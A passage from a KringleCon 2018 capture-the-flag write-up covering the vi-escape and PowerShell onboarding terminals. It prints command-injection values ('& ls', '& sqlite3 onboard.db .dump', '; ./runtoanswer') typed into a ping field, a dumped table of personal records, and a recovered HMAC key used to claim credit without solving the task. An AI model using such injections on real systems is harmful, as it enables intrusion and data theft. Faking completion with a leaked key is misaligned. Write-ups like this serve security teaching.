█.█.....█.█...█.█.█...█    ......█.█..............
███.....█████.█████████    █████.█.█..............
............█..........    ....█.█.█..............
............███.███.███    █.█.█.█.█...........███
..............█...█...█    █.█.█...█...........█.█
..............█.█.█.█.█    ███.█.███...........█.X
..............█.█.█.█.█    █.█.█.█.............█..
..............███.█.█.█    █.█.███.......█████████
................█.█.█.█    █.█.█.........█.....█..
................███.███    █.█.█.......███.█.█████
..................█.█..    █...█.......█...█.█...█
............█████████.█    ███████████████.█.███.█
............█.█.█.....█    █.█.......█.█.█.█...█..
............█.█.███████    █.█.███.███.█.█.█████.█
............█.......█..    █.....█.█.......█...█.█
............█████.█████    ███.███████.█████.█.███
................█......    █...█...........█.█.█.█
................██████S    █.███.█████████████.█.█
</pre>

<div class="org-src-container">
<pre class="src src-html">&lt;<span style="color: #0000ff;">html</span>&gt;&lt;<span style="color: #0000ff;">head</span>&gt;
    &lt;<span style="color: #0000ff;">script</span> <span style="color: #a0522d;">src</span>=<span style="color: #8b2252;">"./conduit.js"</span>&gt;&lt;/<span style="color: #0000ff;">script</span>&gt;
    &lt;<span style="color: #0000ff;">script</span>&gt;
        __POST_RESULTS__({ hash:<span style="color: #8b2252;">"9ab70b3f354515c18885f34e7ac903eedcac2f93d1b28de249e3222ff7f83db9"</span>, 
                           resourceId: <span style="color: #8b2252;">"inigomontoya"</span>});
     &lt;/<span style="color: #0000ff;">script</span>&gt;
&lt;/<span style="color: #0000ff;">head</span>&gt;&lt;<span style="color: #0000ff;">body</span>&gt;&lt;<span style="color: #0000ff;">h1</span>&gt;&lt;<span style="color: #0000ff;">font</span> <span style="color: #a0522d;">color</span>=<span style="color: #8b2252;">"green"</span>&gt;Congratulations!&lt;/<span style="color: #0000ff;">body</span>&gt;&lt;/<span style="color: #0000ff;">html</span>&gt;
</pre>
</div>

<p>
Exiting the vent maze you end up in Santa's Secret Room.  The
other way to get there is through the <a href="#obj6">Scan-o-matic challenge</a>.
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-orga595fe3" class="outline-2">
<h2 id="orga595fe3">Cranberry Pi Terminals</h2>
<div class="outline-text-2" id="text-orga595fe3">
</div>
<div id="outline-container-org1d8938c" class="outline-3">
<h3 id="terminal_overview"><a id="org1d8938c"></a>Overview</h3>
<div class="outline-text-3" id="text-terminal_overview">
<p>
As we walk around, we can find various terminals, and as we talk to
the elves standing near them, we get some hints.
</p>

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Terminal</th>
<th scope="col" class="org-left">Direct URL</th>
<th scope="col" class="org-left">Elf</th>
<th scope="col" class="org-left">Hint</th>
<th scope="col" class="org-left">Location</th>
</tr>
</thead>
<tbody>
<tr>
<td class="org-left">Essential Editor Skills</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=viescape&amp;resource_id=1">viescape</a></td>
<td class="org-left">Bushy Evergreen</td>
<td class="org-left"><a href="https://kb.iu.edu/d/afcz">Indiana University Vi Tutorials</a></td>
<td class="org-left">East side of Lobby</td>
</tr>

<tr>
<td class="org-left">The Name Game</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=pwshmenu&amp;resource_id=2">pwshmenu</a></td>
<td class="org-left">Misty Candycane</td>
<td class="org-left"><a href="https://ss64.com/ps/call.html">PowerShell Command Injection</a> <a href="https://www.digitalocean.com/community/questions/how-do-i-dump-an-sqlite-database">SQLite3 .dump'ing</a></td>
<td class="org-left">West side of Lobby</td>
</tr>

<tr>
<td class="org-left">Lethal ForensicELFification</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=viminfo&amp;resource_id=3">viminfo</a></td>
<td class="org-left">Tangle Coalbox</td>
<td class="org-left"><a href="https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/">Vim Artifacts</a></td>
<td class="org-left">East Hall Corridor</td>
</tr>

<tr>
<td class="org-left">Stall Mucking Report</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=plaintext-creds&amp;resource_id=4">plaintext-creds</a></td>
<td class="org-left">Wunorse Openslae</td>
<td class="org-left"><a href="https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps">Plaintext Credentials in Commands</a></td>
<td class="org-left">East Wing</td>
</tr>

<tr>
<td class="org-left">CURLing Master</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=http2&amp;resource_id=5">http2</a></td>
<td class="org-left">Holly Evergreen</td>
<td class="org-left"><a href="https://developers.google.com/web/fundamentals/performance/http2/">HTTP/2.0 Basics</a></td>
<td class="org-left">West Wing</td>
</tr>

<tr>
<td class="org-left">Yule Log Analysis</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=spray-detect&amp;resource_id=6">spray-detect</a></td>
<td class="org-left">Pepper Minstix</td>
<td class="org-left"><a href="https://securityweekly.com/2017/07/21/tsw11/">Password Spraying</a></td>
<td class="org-left">East Hall Proper</td>
</tr>

<tr>
<td class="org-left">Dev Ops Fail</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=gitpasshist&amp;resource_id=7">gitpasshist</a></td>
<td class="org-left">Sparkle Redberry</td>
<td class="org-left"><a href="https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/">Finding Passwords in Git</a> <a href="https://gist.github.com/hofmannsven/6814451">Git Cheat Sheet</a></td>
<td class="org-left">West side of Balcony</td>
</tr>

<tr>
<td class="org-left">Python Escape from LA</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=python_docker_challenge&amp;resource_id=8">python_docker_challenge</a></td>
<td class="org-left">SugarPlum Mary</td>
<td class="org-left">Python Escape (Check out <a href="https://www.youtube.com/watch?v=ZVx2Sxl3B9c">Mark Baggett's talk upstairs</a>)</td>
<td class="org-left">West side of Balcony</td>
</tr>

<tr>
<td class="org-left">The Sleighbell Lottery</td>
<td class="org-left"><a href="https://docker.kringlecon.com/?challenge=unlinked-function&amp;resource_id=9">unlinked-function</a></td>
<td class="org-left">Shinny Upatree</td>
<td class="org-left"><a href="https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions">Using gdb to Call Random Functions!</a></td>
<td class="org-left">East side of Balcony</td>
</tr>
</tbody>
</table>
</div>
</div>

<div id="outline-container-org5a1c11c" class="outline-3">
<h3 id="org5a1c11c">Essential Editor</h3>
<div class="outline-text-3" id="text-org5a1c11c">
<div id="text-table-of-contents">
<ul>
<li><a href="#org6a7812e">Goal</a></li>
<li><a href="#orgb429dd9">Background</a></li>
<li><a href="#orgb4a1c2d">Intro</a></li>
<li><a href="#orgfed464f">Solution</a></li>
<li><a href="#org930ee0e">Game Internals: How it was made</a></li>
<li><a href="#org57d2cbd">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org6a7812e" class="outline-4">
<h4 id="org6a7812e">Goal</h4>
<div class="outline-text-4" id="text-org6a7812e">
<div class="note">
<p>
Quit the vim editor.
</p>

</div>
</div>
</div>
<div id="outline-container-orgb429dd9" class="outline-4">
<h4 id="orgb429dd9">Background</h4>
<div class="outline-text-4" id="text-orgb429dd9">
</div>
<ul class="org-ul">
<li><a id="org8dc53de"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org8dc53de">
<p>
Bushy Evergreen tells us the following:
</p>

<blockquote>
<p>
Hi, I'm Bushy Evergreen.
</p>

<p>
I'm glad you're here, I'm the target of a terrible trick.
</p>

<p>
Pepper says his editor is the best, but I don't understand why.
</p>

<p>
He's forcing me to learn vi.
</p>

<p>
He gave me a link, I'm supposed to learn the basics.
</p>

<p>
Can you assist me with one of the simple cases?
</p>
</blockquote>
</div>
</li>
<li><a id="org4e0c964"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org4e0c964">
<p>
Once Bushy tells us the above, we get the following hint: <a href="https://kb.iu.edu/d/afcz">Indiana University Vi Tutorials</a>
</p>
</div>
</li>
<li><a id="org7b34646"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-org7b34646">
<p>
None
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgb4a1c2d" class="outline-4">
<h4 id="orgb4a1c2d">Intro</h4>
<div class="outline-text-4" id="text-orgb4a1c2d">
<p>
When we login, we're presented with the following screen:
</p>
<pre class="example">
I'm in quite a fix, I need a quick escape.
Pepper is quite pleased, while I watch here, agape.
Her editor's confusing, though "best" she says - she yells!
My lesson one and your role is exit back to shellz.

-Bushy Evergreen

Exit vi.

</pre>
</div>
</div>
<div id="outline-container-orgfed464f" class="outline-4">
<h4 id="orgfed464f">Solution</h4>
<div class="outline-text-4" id="text-orgfed464f">
<p>
<asciinema-player src="casts/viescape.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
This can be easily solved with the hint from Bushy Evergreen. As
the page says, to exit, hit <code>Esc</code>, then type <code>:q!&lt;Enter&gt;</code>. Escape
ensures that <code>vi</code> is in command mode, <code>q</code> is the command for quit,
and the exclamation point instructs it to not warn us about any
unsaved changes.
</p>
</div>
</div>
<div id="outline-container-org930ee0e" class="outline-4">
<h4 id="org930ee0e">Game Internals: How it was made</h4>
<div class="outline-text-4" id="text-org930ee0e">
<p>
The Docker terminals drop us into a terminal with our Bash shell
running. Normally when Bash is running, it will read some
configuration files on startup, including <code>.bashrc</code> in the user's
home directory. Inspecting our <code>.bashrc</code>, we see the following two
lines at the bottom:
</p>

<div class="org-src-container">
<pre class="src src-sh">vim .message
/usr/local/bin/successfulescape
</pre>
</div>

<p>
When Bash starts, it runs <code>vim</code>, opening the file <code>.message</code>. Whenever <code>vim</code> exits, it runs <code>/usr/local/bin/successfulescape</code>.
</p>

<p>
Using <a href="#appendix_reversing">our technique</a> to reverse engineer binaries, we can recover this script. The main logic of the script is:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">if</span> checkvimps() == <span style="color: #008b8b;">False</span>:
    <span style="color: #a0522d;">hmac256</span> = calcHmac(key, RESOURCEID)
    printResponse(hmac256, RESOURCEID)
    time.sleep(0.5)
    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">'\nYou did it! Congratulations!\n'</span>)
<span style="color: #a020f0;">else</span>:
    <span style="color: #a020f0;">print</span>(<span style="color: #8b2252;">'Hmm.  I think vim is still running...'</span>)
</pre>
</div>

<p>
The <code>checkvimps</code> function will actually make sure that no process
named <code>vi</code> is running. So, even if you had called
<code>successfulescape</code> from within <code>vim</code>, you would not receive
credit.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">def</span> <span style="color: #0000ff;">checkvimps</span>():
    <span style="color: #a0522d;">pids</span> = [pid <span style="color: #a020f0;">for</span> pid <span style="color: #a020f0;">in</span> os.listdir(<span style="color: #8b2252;">'/proc'</span>) <span style="color: #a020f0;">if</span> pid.isdigit()]
    <span style="color: #a020f0;">for</span> pid <span style="color: #a020f0;">in</span> pids:
        <span style="color: #a020f0;">try</span>:
            <span style="color: #a020f0;">if</span> <span style="color: #483d8b;">open</span>(os.path.join(<span style="color: #8b2252;">'/proc'</span>, pid, <span style="color: #8b2252;">'comm'</span>), <span style="color: #8b2252;">'rb'</span>).read()[0:2] == <span style="color: #8b2252;">'vi'</span>:
                <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">True</span>
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">IOError</span>:
            <span style="color: #a020f0;">continue</span>

    <span style="color: #a020f0;">return</span> <span style="color: #008b8b;">False</span>
</pre>
</div>

<p>
The final noteworthy portion of this script is calculating the
<abbr title="Hash-based Message Authentication Code"> HMAC</abbr> which is
sent to the game server to receive credit for completion of this
challenge. The <abbr title="Hash-based Message Authentication Code">
    HMAC</abbr> algorithm is discussed in detail in <a href="#appendix_hmac">Appendix 2</a> However,
the source code does reveal the <abbr title="Hash-based Message
    Authentication Code"> HMAC</abbr> key:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">key</span> = <span style="color: #8b2252;">'2bb6b9c702834095a9c3284e053da124'</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org57d2cbd" class="outline-4">
<h4 id="org57d2cbd">Summary</h4>
<div class="outline-text-4" id="text-org57d2cbd">
<p>
We escaped <code>vim</code> by giving the quit command. We then showed how
<code>vim</code> was being started upon login, and how we received credit for
completing it. We successfully reverse-engineered the
<code>successfulescape</code> binary, and recoved the <abbr title="Hash-based
    Message Authentication Code"> HMAC</abbr> key, so now we can receive
credit without ever solving the challenge at all.
</p>
</div>
</div>
</div>
<div id="outline-container-org1b769a4" class="outline-3">
<h3 id="pwshmenu"><a id="org1b769a4"></a>Powershell Name Game</h3>
<div class="outline-text-3" id="text-pwshmenu">
<div id="text-table-of-contents">
<ul>
<li><a href="#orge3ae2fb">Goal</a></li>
<li><a href="#orgfa0c92d">Background</a></li>
<li><a href="#org19d3cb4">Intro</a></li>
<li><a href="#org3644231">Solution</a></li>
<li><a href="#org09b6c6c">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-orge3ae2fb" class="outline-4">
<h4 id="orge3ae2fb">Goal</h4>
<div class="outline-text-4" id="text-orge3ae2fb">
<div class="note">
<p>
To solve this challenge, determine the new worker's first name and submit to runtoanswer.
</p>

</div>
</div>
</div>
<div id="outline-container-orgfa0c92d" class="outline-4">
<h4 id="orgfa0c92d">Background</h4>
<div class="outline-text-4" id="text-orgfa0c92d">
</div>
<ul class="org-ul">
<li><a id="orgd09a870"></a>Elf Chat<br />
<div class="outline-text-5" id="text-orgd09a870">
<p>
Minty tells us:
</p>

<blockquote>
<p>
Can you help me? I'm in a bit of a fix.
</p>

<p>
I need to make a nametag for an employee, but I can't remember his first name.
</p>

<p>
Maybe you can figure it out using this Cranberry Pi terminal?
</p>

<p>
The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken.
</p>

<p>
PowerShell itself can be tricky when handling user input. Special characters such as &amp; and ; can be used to inject commands.
</p>

<p>
I think that system is one of Alabaster's creations.
</p>

<p>
He's a little &#x2026; obsessed with SQLite database storage.
</p>

<p>
I don't know much about SQLite, just the .dump command.
</p>
</blockquote>
</div>
</li>
<li><a id="orgecf5433"></a>Badge Hint<br />
<div class="outline-text-5" id="text-orgecf5433">
<p>
Talking to Minty unlocks two hints: <a href="https://ss64.com/ps/call.html">PowerShell Call/&amp; Operator</a> and <a href="https://www.digitalocean.com/community/questions/how-do-i-dump-an-sqlite-database">SQLite3 Data Dump</a>.
</p>
</div>
</li>
<li><a id="org187dcac"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-org187dcac">
<p>
None
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org19d3cb4" class="outline-4">
<h4 id="org19d3cb4">Intro</h4>
<div class="outline-text-4" id="text-org19d3cb4">
<p>
When we launch the Cranberry Pi, we see:
</p>

<pre class="example">
We just hired this new worker,
Californian or New Yorker?
Think he's making some new toy bag...
My job is to make his name tag.

Golly gee, I'm glad that you came,
I recall naught but his last name!
Use our system or your own plan,
Find the first name of our guy "Chan!"

-Bushy Evergreen

To solve this challenge, determine the new worker's first name and submit to runtoanswer.




====================================================================
=                                                                  =
= S A N T A ' S  C A S T L E  E M P L O Y E E  O N B O A R D I N G =
=                                                                  =
====================================================================




 Press  1 to start the onboard process.
 Press  2 to verify the system.
 Press  q to quit.


Please make a selection: 
</pre>
</div>
</div>
<div id="outline-container-org3644231" class="outline-4">
<h4 id="org3644231">Solution</h4>
<div class="outline-text-4" id="text-org3644231">
<p>
<asciinema-player src="casts/pwshmenu.cast" preload="yes" poster="npt:0:03"></asciinema-player>
</p>

<p>
Given the hints, it sounds like our penultimate step is to dump the data from SQLite, and look for someone named Chan. The Powershell menu presents us with three options:
</p>

<pre class="example">
Press  1 to start the onboard process.
Press  2 to verify the system.
Press  q to quit.
</pre>

<p>
Maybe we're on a quitting streak after the first terminal, but we
start by trying to get to a command prompt directly, and hit <code>q</code>
to quit. Unfortunately, that hangs the terminal, and we can't type
anything else.
</p>

<p>
Reloading, and trying again, we do the onboard process. Minty mentioned trying to give Powershell tricky characters, like <code>;</code> and <code>&amp;</code>:
</p>

<pre class="example">
Welcome to Santa's Castle!
At Santa's Castle, our employees are our family. We care for each other,
and support everyone in our common goals.
Your first test at Santa's Castle is to complete the new employee onboarding paperwork.
Don't worry, it's an easy test! Just complete the required onboarding information below.
Enter your first name.
: Minty;
Enter your last name.
: Candy Cane &amp;
Enter your street address (line 1 of 2).
: 221B Baker Street;
Enter your street address (line 2 of 2).
: NW1 6XE;
Enter your city.
: London;
Enter your postal code.
: NW1 6XE;
Enter your phone number.
: 8175309;
Enter your email address.
: minty.candycane@kringlecon.com;
Is this correct?
Minty; Candy Cane &amp;
221B Baker Street;
NW1 6XE;
London;, NW1 6XE;
8175309;
minty.candycane@kringlecon.com;
y/n: y
Save to sqlite DB using command line
Press Enter to continue...: 
</pre>

<p>
No luck. Once we hit enter, we're back in the main menu. We'll move on to the last unexplored option, verifying the system.
</p>

<pre class="example">
Validating data store for employee onboard information.
Enter address of server: 1.1.1.1
connect: Network is unreachable
onboard.db: SQLite 3.x database
Press Enter to continue...: 

# Try again...

Validating data store for employee onboard information.
Enter address of server: 8.8.8.8
connect: Network is unreachable
onboard.db: SQLite 3.x database
Press Enter to continue...: 

# One more attempt:

Validating data store for employee onboard information.
Enter address of server: localhost
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.060 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.061 ms
--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2045ms
rtt min/avg/max/mdev = 0.036/0.052/0.061/0.013 ms
onboard.db: SQLite 3.x database
</pre>

<p>
So, the verification pings the server you give it, and then checks the <code>onboard.db</code> file. Once again, let's try giving it some potentially troublesome characters:
</p>

<pre class="example">
Validating data store for employee onboard information.
Enter address of server: &amp;
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
	    [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
	    [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
	    [-w deadline] [-W timeout] [hop1 ...] destination
onboard.db: SQLite 3.x database
Press Enter to continue...: 

# Try again...

Validating data store for employee onboard information.
Enter address of server: ;
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
	    [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
	    [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
	    [-w deadline] [-W timeout] [hop1 ...] destination
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</pre>

<p>
Submitting <code>&amp;</code> and <code>;</code> behave the same &#x2013; we see the usage
information for ping. It's the same output we would see if we
called ping without any arguments. One of the pages that Minty
linked us to said that we can use the <code>&amp;</code> operator in Powershell
to call other commands. Let's try it:
</p>

<pre class="example">
Validating data store for employee onboard information.
Enter address of server: &amp; ls
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
	    [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
	    [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
	    [-w deadline] [-W timeout] [hop1 ...] destination
menu.ps1  onboard.db  runtoanswer
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</pre>

<p>
It's a bit hard to see in the output, but we have a different line
from the time before: <code>menu.ps1 onboard.db runtoanswer</code>. This
would be the output from our <code>ls</code> command.
</p>

<p>
At this point, we can exit the Powershell menu and run our own commands. Now we can dump the SQLite database, using the tips in the second link that Minty provided:
</p>

<pre class="example">
Validating data store for employee onboard information.
Enter address of server: &amp; sqlite3 onboard.db .dump
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
	    [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
	    [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
	    [-w deadline] [-W timeout] [hop1 ...] destination
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
INSERT INTO "onboard" VALUES(10,'Karen','Duck','52 Annfield Rd',NULL,'BEAL','DN14 7AU','077 8656 6609','karensduck@einrot.com');
INSERT INTO "onboard" VALUES(11,'Josephine','Harrell','3 Victoria Road',NULL,'LITTLE ASTON','B74 8XD','079 5532 7917','josephinedharrell@einrot.com');
INSERT INTO "onboard" VALUES(12,'Jason','Madsen','4931 Cliffside Drive',NULL,'Worcester','12197','607-397-0037','jasonlmadsen@einrot.com');
INSERT INTO "onboard" VALUES(13,'Nichole','Murphy','53 St. John Street',NULL,'Craik','S4P 3Y2','306-734-9091','nicholenmurphy@teleworm.us');
INSERT INTO "onboard" VALUES(14,'Mary','Lyons','569 York Mills Rd',NULL,'Toronto','M3B 1Y2','416-274-6639','maryjlyons@superrito.com');
...
</pre>

<p>
Success! But it's hard to find Chan in all of that. Let's see if we can pass our output to the <code>grep</code> command, returning only lines that contain "Chan."
</p>

<pre class="example">
Validating data store for employee onboard information.
Enter address of server: &amp; sqlite3 onboard.db .dump | grep Chan
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
	    [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
	    [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
	    [-w deadline] [-W timeout] [hop1 ...] destination
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
onboard.db: SQLite 3.x database
Press Enter to continue...: 
</pre>

<p>
Great. We now have one final hurdle &#x2013; we need to call <code>runtoanswer</code> and answer the question. The same technique works there too:
</p>

<pre class="example">
Validating data store for employee onboard information.
Enter address of server: &amp; ./runtoanswer
Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
	    [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
	    [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
	    [-w deadline] [-W timeout] [hop1 ...] destination

Loading, please wait......

Enter Mr. Chan's first name: Scott

    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    

Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...: 
</pre>

<p>
<b>Answer</b>:
</p>
<div class="note">
<p>
Scott
</p>

</div>

<p>
This was classic command injection. There were a few other techniques that could've worked here, including using a semicolon instead of the ampersand (e.g. <code>; ./runtoanswer</code>).
</p>

<p>
We also discovered that the <code>menu.ps1</code> script had an unlisted option:
</p>

<div class="org-src-container">
<pre class="src src-powershell"><span style="color: #0000ff;">Show-Menu</span>
<span style="color: #483d8b;">$input</span> = <span style="color: #0000ff;">Read-Host</span> <span style="color: #8b2252;">'Please make a selection'</span>
<span style="color: #a020f0;">switch</span> (<span style="color: #483d8b;">$input</span>)
{
    <span style="color: #8b2252;">'1'</span> {
        cls
        Employee-Onboarding-Form
    } <span style="color: #8b2252;">'2'</span> {
        cls
        <span style="color: #0000ff;">Write-Host</span> <span style="color: #8b2252;">"Validating data store for employee onboard information."</span>
        <span style="color: #a0522d;">$server</span> = <span style="color: #0000ff;">Read-Host</span> <span style="color: #8b2252;">'Enter address of server'</span>
        /bin/bash <span style="color: #008b8b;">-c</span> <span style="color: #8b2252;">"/bin/ping -c 3 $server"</span>
        /bin/bash <span style="color: #008b8b;">-c</span> <span style="color: #8b2252;">"/usr/bin/file onboard.db"</span>
    } <span style="color: #8b2252;">'9'</span> {
        /usr/bin/pwsh
        <span style="color: #a020f0;">return</span>
    } <span style="color: #8b2252;">'q'</span> {
        <span style="color: #a020f0;">return</span>
    } <span style="color: #a020f0;">default</span> {
        <span style="color: #0000ff;">Write-Host</span> <span style="color: #8b2252;">"Invalid entry."</span>
    }
}
pause
</pre>
</div>

<p>
Hitting option 9 drops us into a Powershell shell:
</p>

<pre class="example">
Please make a selection: 9
PowerShell v6.0.3
Copyright (c) Microsoft Corporation. All rights reserved.
https://aka.ms/pscore6-docs
Type 'help' to get help.
PS /home/elf&gt; ./runtoanswer                                                                                                                                                                                                       

Loading, please wait......
</pre>
</div>
</div>

<div id="outline-container-org09b6c6c" class="outline-4">
<h4 id="org09b6c6c">Summary</h4>
<div class="outline-text-4" id="text-org09b6c6c">
<p>
The onboarding Powershell script was vulnerable to command
injection. By running a command to dump the database, we found our
guy, and were able to successfully call
<code>runtoanswer</code>. Furthermore, by inspecting the Powershell source
code, we discovered a hidden backdoor in the menu.
</p>
</div>
</div>
</div>
<div id="outline-container-org94df214" class="outline-3">
<h3 id="viminfo"><a id="org94df214"></a>Vim ForensicELFification</h3>
<div class="outline-text-3" id="text-viminfo">
<div id="text-table-of-contents">
<ul>
<li><a href="#org2edefe5">Goal</a></li>
<li><a href="#org9d34555">Background</a></li>
<li><a href="#org8924668">Intro</a></li>
<li><a href="#orgd226ba9">Solution</a></li>
<li><a href="#orgd8b4999">Summary</a></li>
</ul>
</div>
</div>
<div id="outline-container-org2edefe5" class="outline-4">
<h4 id="org2edefe5">Goal</h4>
<div class="outline-text-4" id="text-org2edefe5">
<div class="note">
<p>
Find the first name of the elf of whom a love poem was written.
</p>

</div>
</div>
</div>
<div id="outline-container-org9d34555" class="outline-4">
<h4 id="org9d34555">Background</h4>
<div class="outline-text-4" id="text-org9d34555">
</div>
<ul class="org-ul">
<li><a id="org5146571"></a>Elf Chat<br />
<div class="outline-text-5" id="text-org5146571">
<p>
Tangle Coalbox helps us by saying:
</p>

<blockquote>
<p>
Hi, I'm Tangle Coalbox.
</p>

<p>
Any chance you can help me with an investigation?
</p>

<p>
Elf Resources assigned me to look into a case, but it seems to require digital forensic skills.
</p>

<p>
Do you know anything about Linux terminal editors and digital traces they leave behind?
</p>

<p>
Apparently editors can leave traces of data behind, but where and how escapes me!
</p>
</blockquote>
</div>
</li>
<li><a id="org44492d0"></a>Badge Hint<br />
<div class="outline-text-5" id="text-org44492d0">
<p>
Tangle also suggests the following site: <a href="https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/">Forensic Relevance of Vim Artifacts</a>
</p>
</div>
</li>
<li><a id="orgad0a016"></a>Relevant KringleCon Videos<br />
<div class="outline-text-5" id="text-orgad0a016">
<p>
None
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-org8924668" class="outline-4">
<h4 id="org8924668">Intro</h4>
<div class="outline-text-4" id="text-org8924668">
<p>
When we open the terminal, we see:
</p>

<pre class="example">
Christmas is coming, and so it would seem,
ER (Elf Resources) crushes elves' dreams.
One tells me she was disturbed by a bloke.
He tells me this must be some kind of joke.

